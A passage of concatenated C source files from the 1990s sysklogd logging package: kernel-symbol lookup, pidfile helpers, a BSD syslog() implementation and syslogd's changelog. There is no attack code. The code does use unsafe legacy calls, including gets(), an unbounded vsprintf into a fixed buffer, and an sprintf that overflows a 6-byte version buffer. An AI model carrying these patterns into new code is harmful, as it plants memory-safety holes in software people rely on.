	auto char	type,
			sym[512];

	auto int version = 0;

	auto unsigned long int address;

	auto FILE *sym_file;


	/*
	 * Search for and open the file containing the kernel symbols.
	 */
	if ( mapfile != (char *) 0 )
	{
		if ( (sym_file = fopen(mapfile, "r")) == (FILE *) 0 )
		{
			Syslog(LOG_WARNING, "Cannot open map file: %s.", \
			       mapfile);
			return(0);
		}
	}
	else
	{
		if ( (mapfile = FindSymbolFile()) == (char *) 0 ) 
		{
			Syslog(LOG_WARNING, "Cannot find map file.");
			if ( debugging )
				fputs("Cannot find map file.\n", stderr);
			return(0);
		}
		
		if ( (sym_file = fopen(mapfile, "r")) == (FILE *) 0 )
		{
			Syslog(LOG_WARNING, "Cannot open map file.");
			if ( debugging )
				fputs("Cannot open map file.\n", stderr);
			return(0);
		}
	}
	

	/*
	 * Read the kernel symbol table file and add entries for each
	 * line.  I suspect that the use of fscanf is not really in vogue
	 * but it was quick and dirty and IMHO suitable for fixed format
	 * data such as this.  If anybody doesn't agree with this please
	 * e-mail me a diff containing a parser with suitable political
	 * correctness -- GW.
	 */
	while ( !feof(sym_file) )
	{
		if ( fscanf(sym_file, "%8lx %c %s\n", &address, &type, sym)
		    != 3 )
		{
			Syslog(LOG_ERR, "Error in symbol table input.");
			fclose(sym_file);
			return(0);
		}
		if ( VERBOSE_DEBUGGING && debugging )
			fprintf(stderr, "Address: %lx, Type: %c, Symbol: %s\n",
				address, type, sym);

		if ( AddSymbol(address, sym) == 0 )
		{
			Syslog(LOG_ERR, "Error adding symbol - %s.", sym);
			return(0);
		}

		if ( version == 0 )
			version = CheckVersion(sym);
	}
	

	Syslog(LOG_INFO, "Loaded %d symbols from %s.", num_syms, mapfile);
	switch ( version )
	{
	    case -1:
		Syslog(LOG_WARNING, "Symbols do not match kernel version.");
		num_syms = 0;
		break;

	    case 0:
		Syslog(LOG_WARNING, "Cannot verify that symbols match " \
		       "kernel version.");
		break;
		
	    case 1:
		Syslog(LOG_INFO, "Symbols match kernel version.");
		break;
	}
		
	fclose(sym_file);
	return(1);
}


/**************************************************************************
 * Function:	FindSymbolFile
 *
 * Purpose:	This function is responsible for encapsulating the search
 *		for a valid symbol file.  Encapsulating the search for
 *		the map file in this function allows an intelligent search
 *		process to be implemented.
 *
 *		The list of symbol files will be searched until either a
 *		symbol file is found whose version matches the currently
 *		executing kernel or the end of the list is encountered.  If
 *		the end of the list is encountered the first available
 *		symbol file is returned to the caller.
 *
 *		This strategy allows klogd to locate valid symbol files
 *		for both a production and an experimental kernel.  For
 *		example a map for a production kernel could be installed
 *		in /boot.  If an experimental kernel is loaded the map
 *		in /boot will be skipped and the map in /usr/src/linux would
 *		be used if its version number matches the executing kernel.
 *
 * Arguements:	None specified.
 *
 * Return:	char *
 *
 *		If a valid system map cannot be located a null pointer
 *		is returned to the caller.
 *
 *		If the search is succesful a pointer is returned to the
 *		caller which points to the name of the file containing
 *		the symbol table to be used.
 **************************************************************************/

static char * FindSymbolFile()

{
	auto char	type,
			*file = (char *) 0,
			**mf = system_maps,
			sym[512];

	auto int version;
	
	auto unsigned long int address;

	auto FILE *sym_file = (FILE *) 0;


	if ( debugging )
		fputs("Searching for symbol map.\n", stderr);
	
	for (mf = system_maps; *mf != (char *) 0; ++mf)
	{
		if ( debugging )
			fprintf(stderr, "Trying %s.\n", *mf);
		if ( (sym_file = fopen(*mf, "r")) == (FILE *) 0 )
			continue;
		
		/*
		 * At this point a map file was successfully opened.  We
		 * now need to search this file and look for a version
		 * version information.
		 */
		version = 0;
		while ( !feof(sym_file) && (version == 0) )
		{
			if ( fscanf(sym_file, "%8lx %c %s\n", &address, \
				    &type, sym) != 3 )
			{
				Syslog(LOG_ERR, "Error in symbol table input.");
				fclose(sym_file);
				return((char *) 0);
			}
			if ( VERBOSE_DEBUGGING && debugging )
				fprintf(stderr, "Address: %lx, Type: %c, " \
				    "Symbol: %s\n", address, type, sym);

			version = CheckVersion(sym);
		}
		fclose(sym_file);

		switch ( version )
		{
		    case -1:
			if ( debugging )
				fprintf(stderr, "Symbol table has incorrect " \
					"version number.\n");
			break;
			
		    case 0:
			if ( debugging )
				fprintf(stderr, "No version information " \
					"found.\n");
			if ( file == (char *) 0 )
			{
				if ( debugging )
					fputs("Saving filename.\n", stderr);
				file = *mf;
			}
			break;
		    case 1:
			if ( debugging )
				fprintf(stderr, "Found table with " \
					"matching version number.\n");
			return(*mf);
			break;
		}
	}


	/*
	 * At this stage of the game we are at the end of the symbol
	 * tables.  We have evidently not found a symbol map whose version
	 * information matches the currently executing kernel.  If possible
	 * we return a pointer to the first valid symbol map that was
	 * encountered.
	 */
	if ( debugging )
		fprintf(stderr, "End of search list encountered.\n");
	return(file);
}


/**************************************************************************
 * Function:	CheckVersion
 *
 * Purpose:	This function is responsible for determining whether or
 *		the system map being loaded matches the version of the
 *		currently running kernrel.
 *
 *		The kernel version is checked by examing a variable which
 *		is of the form:	_Version_66347 (a.out) or Version_66437 (ELF).
 *
 *		The suffix of this variable is the current kernel version
 *		of the kernel encoded in base 256.  For example the
 *		above variable would be decoded as:
 *
 *			(66347 = 1*65536 + 3*256 + 43 = 1.3.43)
 *
 *		(Insert appropriate deities here) help us if Linus ever
 *		needs more than 255 patch levels to get a kernel out the
 *		door... :-)
 *
 * Arguements:	(char *) version
 *
 *			version:->	A pointer to the string which
 *					is to be decoded as a kernel
 *					version variable.
 *
 * Return:	int
 *
 *		       -1:->	The currently running kernel version does
 *				not match this version string.
 *
 *			0:->	The string is not a kernel version variable.
 *
 *			1:->	The executing kernel is of the same version
 *				as the version string.
 **************************************************************************/

static int CheckVersion(version)

	char *version;
	

{
	auto char vstring[6];

	auto int	vnum,
			major,
			minor,
			patch;

	auto struct utsname utsname;

	static char *prefix = { "Version_" };


	/* Early return if there is no hope. */
	if ( strncmp(version, prefix, strlen(prefix)) == 0  /* ELF */ ||
	   (*version == '_' &&
		strncmp(++version, prefix, strlen(prefix)) == 0 ) /* a.out */ )
		;
	else
		return(0);


	/*
	 * Since the symbol looks like a kernel version we can start
	 * things out by decoding the version string into its component
	 * parts.
	 */
	memset(vstring, '\0', sizeof(vstring));
	strncpy(vstring, version + strlen(prefix), sizeof(vstring)-1);
	vnum = atoi(vstring);
	major = vnum / 65536;
	vnum -= (major * 65536);
	minor = vnum / 256;
	patch = vnum - (minor * 256);
	if ( debugging )
		fprintf(stderr, "Version string = %s, Major = %d, " \
		       "Minor = %d, Patch = %d.\n", vstring, major, minor, \
		       patch);
	sprintf(vstring, "%d.%d.%d", major, minor, patch);

	/*
	 * We should now have the version string in the vstring variable in
	 * the same format that it is stored in by the kernel.  We now
	 * ask the kernel for its version information and compare the two
	 * values to determine if our system map matches the kernel
	 * version level.
	 */
	if ( uname(&utsname) < 0 )
	{
		Syslog(LOG_ERR, "Cannot get kernel version information.");
		return(0);
	}
	if ( debugging )
		fprintf(stderr, "Comparing kernel %s with symbol table %s.\n",\
		       utsname.release, vstring);

	/* Failure. */
	if ( strcmp(vstring, utsname.release) != 0 )
		return(-1);

	/* Success. */
	return(1);
}

	
/**************************************************************************
 * Function:	AddSymbol
 *
 * Purpose:	This function is responsible for adding a symbol name
 *		and its address to the symbol table.
 *
 * Arguements:	(unsigned long) address, (char *) symbol
 *
 * Return:	int
 *
 *		A boolean value is assumed.  True if the addition is
 *		successful.  False if not.
 **************************************************************************/

static int AddSymbol(address, symbol)

	unsigned long address;
	
	char *symbol;
	
{
	/* Allocate the the symbol table entry. */
	sym_array = (struct sym_table *) realloc(sym_array, (num_syms+1) * \
						 sizeof(struct sym_table));
	if ( sym_array == (struct sym_table *) 0 )
		return(0);

	/* Then the space for the symbol. */
	sym_array[num_syms].name = (char *) malloc(strlen(symbol)*sizeof(char)\
						   + 1);
	if ( sym_array[num_syms].name == (char *) 0 )
		return(0);
	
	sym_array[num_syms].value = address;
	strcpy(sym_array[num_syms].name, symbol);
	++num_syms;
	return(1);
}


/**************************************************************************
 * Function:	LookupSymbol
 *
 * Purpose:	Find the symbol which is related to the given kernel
 *		address.
 *
 * Arguements:	(long int) value, (struct symbol *) sym
 *
 *		value:->	The address to be located.
 * 
 *		sym:->		A pointer to a structure which will be
 *				loaded with the symbol's parameters.
 *
 * Return:	(char *)
 *
 *		If a match cannot be found a diagnostic string is printed.
 *		If a match is found the pointer to the symbolic name most
 *		closely matching the address is returned.
 **************************************************************************/

extern char * LookupSymbol(value, sym)

	unsigned long value;

	struct symbol *sym;
	
{
	auto int lp;
	
	auto char *last = sym_array[0].name;


	sym->offset = 0;
	sym->size = 0;
	if ( value < sym_array[0].value )
		return((char *) 0);
	
	for(lp= 0; lp <= num_syms; ++lp)
	{
		if ( sym_array[lp].value > value )
		{		
			sym->offset = value - sym_array[lp-1].value;
			sym->size = sym_array[lp].value - \
				sym_array[lp-1].value;
			return(last);
		}
		last = sym_array[lp].name;
	}

	return((char *) 0);
}


/**************************************************************************
 * Function:	LogExpanded
 *
 * Purpose:	This function is responsible for logging a kernel message
 *		line after all potential numeric kernel addresses have
 *		been resolved symolically.
 *
 * Arguements:	(char *) line, (char *) el
 *
 *		line:->	A pointer to the buffer containing the kernel
 *			message to be expanded and logged.
 *
 *		el:->	A pointer to the buffer into which the expanded
 *			kernel line will be written.
 *
 * Return:	void
 **************************************************************************/

extern char * ExpandKadds(line, el)

	char *line;

	char *el;
	
{
	auto char	dlm,
			*kp,
			*sl = line,
			*elp = el,
			*symbol;

	auto int value;

	auto struct symbol sym;
	
	
	/*
	 * Early return if there do not appear to be any kernel
	 * messages in this line.
	 */
	if ( (num_syms == 0) ||
	     (kp = strstr(line, "[<")) == (char *) 0 )
	{
		strcpy(el, line);
		return(el);
	}

	/* Loop through and expand all kernel messages. */
	do
	{
		while ( sl < kp+1 )
			*elp++ = *sl++;

		/* Now poised at a kernel delimiter. */
	        if ( (kp = strstr(sl, ">]")) == (char *) 0 )
		{
			strcpy(el, sl);
			return(el);
		}
		dlm = *kp;
		*kp = '\0';
		value = strtol(sl+1, (char **) 0, 16);
		if ( (symbol = LookupSymbol(value, &sym)) == (char *) 0 )
			symbol = sl;
			
		strcat(elp, symbol);
		elp += strlen(symbol);
		if ( debugging )
			fprintf(stderr, "Symbol: %s = %x = %s, %d/%d\n", \
				sl+1, value, \
				(sym.size==0) ? symbol+1 : symbol, \
				sym.offset, sym.size);

		*kp = dlm;
		value = 2;
		if ( sym.size != 0 )
		{
			--value;
			++kp;
			elp += sprintf(elp, "+%d/%d", sym.offset, sym.size);
		}
		strncat(elp, kp, value);
		elp += value;
		sl = kp + value;
		if ( (kp = strstr(sl, "[<")) == (char *) 0 )
			strcat(elp, sl);
	}
	while ( kp != (char *) 0);
		
	if ( debugging )
		fprintf(stderr, "Expanded line: %s\n", el);
	return(el);
}


/*
 * Setting the -DTEST define enables the following code fragment to
 * be compiled.  This produces a small standalone program which will
 * echo the standard input of the process to stdout while translating
 * all numeric kernel addresses into their symbolic equivalent.
 */
#if defined(TEST)

#include <stdarg.h>

extern int main(int, char **);


extern int main(int argc, char *argv[])
{
	auto long int value;
	auto char line[1024], eline[2048];
	
	
#if 0
	value = atol(argv[1]);
	fprintf(stdout, "Value of %ld: %s\n", value, LookupSymbol(value));
#endif

	if ( !InitKsyms((char *) 0) )
	{
		fputs("ksym: Error loading system map.\n", stderr);
		return(1);
	}
	
	while ( !feof(stdin) )
	{
		gets(line);
		memset(eline, '\0', sizeof(eline));
		ExpandKadds(line, eline);
		fprintf(stdout, "%s\n", eline);
	}
	

	return(0);
}

extern void Syslog(int priority, char *fmt, ...)

{
	va_list ap;

	va_start(ap, fmt);
	fprintf(stdout, "Pr: %d, ", priority);
	vfprintf(stdout, fmt, ap);
	va_end(ap);
	fputc('\n', stdout);

	return;
}
#endif
/*
    pidfile.c - interact with pidfiles
    Copyright (c) 1995  Martin Schulze <Martin.Schulze@Linux.DE>

    This file is part of the sysklogd package, a kernel and system log daemon.

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
*/

/*
 * Sat Aug 19 13:24:33 MET DST 1995: Martin Schulze
 *	First version (v0.2) released
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <string.h>
#include <errno.h>
#include <signal.h>

/* read_pid
 *
 * Reads the specified pidfile and returns the read pid.
 * 0 is returned if either there's no pidfile, it's empty
 * or no pid can be read.
 */
int read_pid (char *pidfile)
{
  FILE *f;
  int pid;

  if (!(f=fopen(pidfile,"r")))
    return 0;
  fscanf(f,"%d", &pid);
  fclose(f);
  return pid;
}

/* check_pid
 *
 * Reads the pid using read_pid and looks up the pid in the process
 * table (using /proc) to determine if the process already exists. If
 * so 1 is returned, otherwise 0.
 */
int check_pid (char *pidfile)
{
  int pid = read_pid(pidfile);

  /* Amazing ! _I_ am already holding the pid file... */
  if ((!pid) || (pid == getpid ()))
    return 0;

  /*
   * The 'standard' method of doing this is to try and do a 'fake' kill
   * of the process.  If an ESRCH error is returned the process cannot
   * be found -- GW
   */
  /* But... errno is usually changed only on error.. */
  if (kill(pid, 0) && errno == ESRCH)
	  return(0);

  return pid;
}

/* write_pid
 *
 * Writes the pid to the specified file. If that fails 0 is
 * returned, otherwise the pid.
 */
int write_pid (char *pidfile)
{
  FILE *f;
  int fd;
  int pid;

  if ( ((fd = open(pidfile, O_RDWR|O_CREAT, 0644)) == -1)
       || ((f = fdopen(fd, "r+")) == NULL) ) {
      fprintf(stderr, "Can't open or create %s.\n", pidfile);
      return 0;
  }

  if (flock(fd, LOCK_EX|LOCK_NB) == -1) {
      fscanf(f, "%d", &pid);
      fclose(f);
      printf("Can't lock, lock is held by pid %d.\n", pid);
      return 0;
  }

  pid = getpid();
  if (!fprintf(f,"%d\n", pid)) {
      printf("Can't write pid , %s.\n", strerror(errno));
      close(fd);
      return 0;
  }
  fflush(f);

  if (flock(fd, LOCK_UN) == -1) {
      printf("Can't unlock pidfile %s, %s.\n", pidfile, strerror(errno));
      close(fd);
      return 0;
  }
  close(fd);

  return pid;
}

/* remove_pid
 *
 * Remove the the specified file. The result from unlink(2)
 * is returned
 */
int remove_pid (char *pidfile)
{
  return unlink (pidfile);
}
  
/*
    pidfile.h - interact with pidfiles
    Copyright (c) 1995  Martin Schulze <Martin.Schulze@Linux.DE>

    This file is part of the sysklogd package, a kernel and system log daemon.

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
*/

/* read_pid
 *
 * Reads the specified pidfile and returns the read pid.
 * 0 is returned if either there's no pidfile, it's empty
 * or no pid can be read.
 */
int read_pid (char *pidfile);

/* check_pid
 *
 * Reads the pid using read_pid and looks up the pid in the process
 * table (using /proc) to determine if the process already exists. If
 * so 1 is returned, otherwise 0.
 */
int check_pid (char *pidfile);

/* write_pid
 *
 * Writes the pid to the specified file. If that fails 0 is
 * returned, otherwise the pid.
 */
int write_pid (char *pidfile);

/* remove_pid
 *
 * Remove the the specified file. The result from unlink(2)
 * is returned
 */
int remove_pid (char *pidfile);
/*
 * Copyright (c) 1983, 1988 Regents of the University of California.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms are permitted provided
 * that: (1) source distributions retain this entire copyright notice and
 * comment, and (2) distributions including binaries display the following
 * acknowledgement:  ``This product includes software developed by the
 * University of California, Berkeley and its contributors'' in the
 * documentation or other materials provided with the distribution and in
 * all advertising materials mentioning features or use of this software.
 * Neither the name of the University nor the names of its contributors may
 * be used to endorse or promote products derived from this software without
 * specific prior written permission.
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR IMPLIED
 * WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.
 */

#if defined(LIBC_SCCS) && !defined(lint)
static char sccsid[] = "@(#)syslog.c	5.28 (Berkeley) 6/27/90";
#endif /* LIBC_SCCS and not lint */

/*
 * SYSLOG -- print message on log file
 *
 * This routine looks a lot like printf, except that it outputs to the
 * log file instead of the standard output.  Also:
 *	adds a timestamp,
 *	prints the module name in front of the message,
 *	has some other formatting types (or will sometime),
 *	adds a newline on the end of the message.
 *
 * The output of this routine is intended to be read by syslogd(8).
 *
 * Author: Eric Allman
 * Modified to use UNIX domain IPC by Ralph Campbell
 *
 * Sat Dec 11 11:58:31 CST 1993: Dr. Wettstein
 *	Changes to allow compilation with no complains under -Wall.
 *
 * Thu Jan 18 11:16:11 CST 1996: Dr. Wettstein
 *	Added patch to close potential security hole.  This is the same
 *	patch which was announced in the linux-security mailing lists
 *	and incorporated into the libc version of syslog.c.
 *
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/file.h>
#include <sys/signal.h>
#include <sys/syslog.h>
#if 0
#include "syslog.h"
#include "pathnames.h"
#endif

#include <linux/uio.h>
#include <sys/wait.h>
#include <netdb.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>
#include <stdarg.h>
#include <paths.h>
#include <stdio.h>

#define	_PATH_LOGNAME	"/dev/log"

static int	LogFile = -1;		/* fd for log */
static int	connected;		/* have done connect */
static int	LogStat = 0;		/* status bits, set by openlog() */
static const char *LogTag = "syslog";	/* string to tag the entry with */
static int	LogFacility = LOG_USER;	/* default facility code */

void
syslog(int pri, const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	vsyslog(pri, fmt, ap);
	va_end(ap);
}

void
vsyslog(pri, fmt, ap)
	int pri;
	const char *fmt;
	va_list ap;
{
	register int cnt;
	register char *p;
	time_t now;
	int fd, saved_errno;
	char tbuf[2048], fmt_cpy[1024], *stdp = (char *) 0;

	saved_errno = errno;

	/* see if we should just throw out this message */
	if (!LOG_MASK(LOG_PRI(pri)) || (pri &~ (LOG_PRIMASK|LOG_FACMASK)))
		return;
	if (LogFile < 0 || !connected)
		openlog(LogTag, LogStat | LOG_NDELAY, 0);

	/* set default facility if none specified */
	if ((pri & LOG_FACMASK) == 0)
		pri |= LogFacility;

	/* build the message */
	(void)time(&now);
	(void)sprintf(tbuf, "<%d>%.15s ", pri, ctime(&now) + 4);
	for (p = tbuf; *p; ++p);
	if (LogStat & LOG_PERROR)
		stdp = p;
	if (LogTag) {
		(void)strcpy(p, LogTag);
		for (; *p; ++p);
	}
	if (LogStat & LOG_PID) {
		(void)sprintf(p, "[%d]", getpid());
		for (; *p; ++p);
	}
	if (LogTag) {
		*p++ = ':';
		*p++ = ' ';
	}

	/* substitute error message for %m */
	{
		register char ch, *t1, *t2;
		char *strerror();

		for (t1 = fmt_cpy;
		     (ch = *fmt) != '\0' && t1<fmt_cpy+sizeof(fmt_cpy);
		     ++fmt)
			if (ch == '%' && fmt[1] == 'm') {
				++fmt;
				for (t2 = strerror(saved_errno);
				    (*t1 = *t2++); ++t1);
			}
			else
				*t1++ = ch;
		*t1 = '\0';
	}

	(void)vsprintf(p, fmt_cpy, ap);

	cnt = strlen(tbuf);

	/* output to stderr if requested */
	if (LogStat & LOG_PERROR) {
		struct iovec iov[2];
		register struct iovec *v = iov;

		v->iov_base = stdp;
		v->iov_len = cnt - (stdp - tbuf);
		++v;
		v->iov_base = "\n";
		v->iov_len = 1;
		(void)writev(2, iov, 2);
	}

	/* output the message to the local logger */
	if (write(LogFile, tbuf, cnt + 1) >= 0 || !(LogStat&LOG_CONS))
		return;

	/*
	 * output the message to the console; don't worry about
	 * blocking, if console blocks everything will.
	 */
	if ((fd = open(_PATH_CONSOLE, O_WRONLY|O_NOCTTY, 0)) < 0)
		return;
	(void)strcat(tbuf, "\r\n");
	cnt += 2;
	p = index(tbuf, '>') + 1;
	(void)write(fd, p, cnt - (p - tbuf));
	(void)close(fd);
}

static struct sockaddr SyslogAddr;	/* AF_UNIX address of local logger */
/*
 * OPENLOG -- open system log
 */
void
openlog(ident, logstat, logfac)
	const char *ident;
	int logstat, logfac;
{
	if (ident != NULL)
		LogTag = ident;
	LogStat = logstat;

#ifdef ALLOW_KERNEL_LOGGING
	if ((logfac &~ LOG_FACMASK) == 0)
#else
	if (logfac != 0 && (logfac &~ LOG_FACMASK) == 0)
#endif
		LogFacility = logfac;

	if (LogFile == -1) {
		SyslogAddr.sa_family = AF_UNIX;
		strncpy(SyslogAddr.sa_data, _PATH_LOGNAME,
		    sizeof(SyslogAddr.sa_data));
		if (LogStat & LOG_NDELAY) {
			LogFile = socket(AF_UNIX, SOCK_STREAM, 0);
/*			fcntl(LogFile, F_SETFD, 1); */
		}
	}
	if (LogFile != -1 && !connected &&
	    connect(LogFile, &SyslogAddr, sizeof(SyslogAddr.sa_family)+
			strlen(SyslogAddr.sa_data)) != -1)
		connected = 1;
}

/*
 * CLOSELOG -- close the system log
 */
void
closelog()
{
	(void) close(LogFile);
	LogFile = -1;
	connected = 0;
}

static int	LogMask = 0xff;		/* mask of priorities to be logged */
/*
 * SETLOGMASK -- set the log mask level
 */
int
setlogmask(pmask)
	int pmask;
{
	int omask;

	omask = LogMask;
	if (pmask != 0)
		LogMask = pmask;
	return (omask);
}
/*
 * Copyright (c) 1983, 1988 Regents of the University of California.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms are permitted
 * provided that the above copyright notice and this paragraph are
 * duplicated in all such forms and that any documentation,
 * advertising materials, and other materials related to such
 * distribution and use acknowledge that the software was developed
 * by the University of California, Berkeley.  The name of the
 * University may not be used to endorse or promote products derived
 * from this software without specific prior written permission.
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED
 * WARRANTIES OF MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE.
 */

#if !defined(lint) && !defined(NO_SCCS)
char copyright2[] =
"@(#) Copyright (c) 1983, 1988 Regents of the University of California.\n\
 All rights reserved.\n";
#endif /* not lint */

#if !defined(lint) && !defined(NO_SCCS)
static char sccsid[] = "@(#)syslogd.c	5.27 (Berkeley) 10/10/88";
#endif /* not lint */

/*
 *  syslogd -- log system messages
 *
 * This program implements a system log. It takes a series of lines.
 * Each line may have a priority, signified as "<n>" as
 * the first characters of the line.  If this is
 * not present, a default priority is used.
 *
 * To kill syslogd, send a signal 15 (terminate).  A signal 1 (hup) will
 * cause it to reread its configuration file.
 *
 * Defined Constants:
 *
 * MAXLINE -- the maximum line length that can be handled.
 * DEFUPRI -- the default priority for user messages
 * DEFSPRI -- the default priority for kernel messages
 *
 * Author: Eric Allman
 * extensive changes by Ralph Campbell
 * more extensive changes by Eric Allman (again)
 *
 * Steve Lord:	Fix UNIX domain socket code, added linux kernel logging
 *		change defines to
 *		SYSLOG_INET	- listen on a UDP socket
 *		SYSLOG_UNIXAF	- listen on unix domain socket
 *		SYSLOG_KERNEL	- listen to linux kernel
 *
 * Mon Feb 22 09:55:42 CST 1993:  Dr. Wettstein
 * 	Additional modifications to the source.  Changed priority scheme
 *	to increase the level of configurability.  In its stock configuration
 *	syslogd no longer logs all messages of a certain priority and above
 *	to a log file.  The * wildcard is supported to specify all priorities.
 *	Note that this is a departure from the BSD standard.
 *
 *	Syslogd will now listen to both the inetd and the unixd socket.  The
 *	strategy is to allow all local programs to direct their output to
 *	syslogd through the unixd socket while the program listens to the
 *	inetd socket to get messages forwarded from other hosts.
 *
 * Fri Mar 12 16:55:33 CST 1993:  Dr. Wettstein
 *	Thanks to Stephen Tweedie (dcs.ed.ac.uk!sct) for helpful bug-fixes
 *	and an enlightened commentary on the prioritization problem.
 *
 *	Changed the priority scheme so that the default behavior mimics the
 *	standard BSD.  In this scenario all messages of a specified priority
 *	and above are logged.
 *
 *	Add the ability to specify a wildcard (=) as the first character
 *	of the priority name.  Doing this specifies that ONLY messages with
 *	this level of priority are to be logged.  For example:
 *
 *		*.=debug			/usr/adm/debug
 *
 *	Would log only messages with a priority of debug to the /usr/adm/debug
 *	file.
 *
 *	Providing an * as the priority specifies that all messages are to be
 *	logged.  Note that this case is degenerate with specifying a priority
 *	level of debug.  The wildcard * was retained because I believe that
 *	this is more intuitive.
 *
 * Thu Jun 24 11:34:13 CDT 1993:  Dr. Wettstein
 *	Modified sources to incorporate changes in libc4.4.  Messages from
 *	syslog are now null-terminated, syslogd code now parses messages
 *	based on this termination scheme.  Linux as of libc4.4 supports the
 *	fsync system call.  Modified code to fsync after all writes to
 *	log files.
 *
 * Sat Dec 11 11:59:43 CST 1993:  Dr. Wettstein
 *	Extensive changes to the source code to allow compilation with no
 *	complaints with -Wall.
 *
 *	Reorganized the facility and priority name arrays so that they
 *	compatible with the syslog.h source found in /usr/include/syslog.h.
 *	NOTE that this should really be changed.  The reason I do not
 *	allow the use of the values defined in syslog.h is on account of
 *	the extensions made to allow the wildcard character in the
 *	priority field.  To fix this properly one should malloc an array,
 *	copy the contents of the array defined by syslog.h and then
 *	make whatever modifications that are desired.  Next round.
 *
 * Thu Jan  6 12:07:36 CST 1994:  Dr. Wettstein
 *	Added support for proper decomposition and re-assembly of
 *	fragment messages on UNIX domain sockets.  Lack of this capability
 *	was causing 'partial' messages to be output.  Since facility and
 *	priority information is encoded as a leader on the messages this
 *	was causing lines to be placed in erroneous files.
 *
 *	Also added a patch from Shane Alderton (shane@scs.apana.org.au) to
 *	correct a problem with syslogd dumping core when an attempt was made
 *	to write log messages to a logged-on user.  Thank you.
 *
 *	Many thanks to Juha Virtanen (jiivee@hut.fi) for a series of
 *	interchanges which lead to the fixing of problems with messages set
 *	to priorities of none and emerg.  Also thanks to Juha for a patch
 *	to exclude users with a class of LOGIN from receiving messages.
 *
 *	Shane Alderton provided an additional patch to fix zombies which
 *	were conceived when messages were written to multiple users.
 *
 * Mon Feb  6 09:57:10 CST 1995:  Dr. Wettstein
 *	Patch to properly reset the single priority message flag.  Thanks
 *	to Christopher Gori for spotting this bug and forwarding a patch.
 *
 * Wed Feb 22 15:38:31 CST 1995:  Dr. Wettstein
 *	Added version information to startup messages.
 *
 *	Added defines so that paths to important files are taken from
 *	the definitions in paths.h.  Hopefully this will insure that
 *	everything follows the FSSTND standards.  Thanks to Chris Metcalf
 *	for a set of patches to provide this functionality.  Also thanks
 *	Elias Levy for prompting me to get these into the sources.
 *
 * Wed Jul 26 18:57:23 MET DST 1995:  Martin Schulze
 *	Linux' gethostname only returns the hostname and not the fqdn as
 *	expected in the code. But if you call hostname with an fqdn then
 *	gethostname will return an fqdn, so we have to mention that. This
 *	has been changed.
 *
 *	The 'LocalDomain' and the hostname of a remote machine is
 *	converted to lower case, because the original caused some
 *	inconsistency, because the (at least my) nameserver did respond an
 *	fqdn containing of upper- _and_ lowercase letters while
 *	'LocalDomain' consisted only of lowercase letters and that didn't
 *	match.
 *
 * Sat Aug  5 18:59:15 MET DST 1995:  Martin Schulze
 *	Now no messages that were received from any remote host are sent
 *	out to another. At my domain this missing feature caused ugly
 *	syslog-loops, sometimes.
 *
 *	Remember that no message is sent out. I can't figure out any
 *	scenario where it might be useful to change this behavior and to
 *	send out messages to other hosts than the one from which we
 *	received the message, but I might be shortsighted. :-/
 *
 * Thu Aug 10 19:01:08 MET DST 1995:  Martin Schulze
 *	Added my pidfile.[ch] to it to perform a better handling with
 *	pidfiles. Now both, syslogd and klogd, can only be started
 *	once. They check the pidfile.
 *
 * Sun Aug 13 19:01:41 MET DST 1995:  Martin Schulze
 *	Add an addition to syslog.conf's interpretation. If a priority
 *	begins with an exclamation mark ('!') the normal interpretation
 *	of the priority is inverted: ".!*" is the same as ".none", ".!=info"
 *	don't logs the info priority, ".!crit" won't log any message with
 *	the priority crit or higher. For example:
 *
 *		mail.*;mail.!=info		/usr/adm/mail
 *
 *	Would log all messages of the facility mail except those with
 *	the priority info to /usr/adm/mail. This makes the syslogd
 *	much more flexible.
 *
 *	Defined TABLE_ALLPRI=255 and changed some occurrences.
 *
 * Sat Aug 19 21:40:13 MET DST 1995:  Martin Schulze
 *	Making the table of facilities and priorities while in debug
 *	mode more readable.
 *
 *	If debugging is turned on, printing the whole table of
 *	facilities and priorities every hexadecimal or 'X' entry is
 *	now 2 characters wide.
 *
 *	The number of the entry is prepended to each line of
 *	facilities and priorities, and F_UNUSED lines are not shown
 *	anymore.
 *
 *	Corrected some #ifdef SYSV's.
 *
 * Mon Aug 21 22:10:35 MET DST 1995:  Martin Schulze
 *	Corrected a strange behavior during parsing of configuration
 *	file. The original BSD syslogd doesn't understand spaces as
 *	separators between specifier and action. This syslogd now
 *	understands them. The old behavior caused some confusion over
 *	the Linux community.
 *
 * Thu Oct 19 00:02:07 MET 1995:  Martin Schulze
 *	The default behavior has changed for security reasons. The
 *	syslogd will not receive any remote message unless you turn
 *	reception on with the "-r" option.
 *
 *	Not defining SYSLOG_INET will result in not doing any network
 *	activity, i.e. not sending or receiving messages. I changed
 *	this because the old idea is implemented with the "-r" option
 *	and the old thing didn't work anyway.
 *
 * Thu Oct 26 13:14:06 MET 1995:  Martin Schulze
 *	Added another logfile type F_FORW_UNKN. The problem I ran into
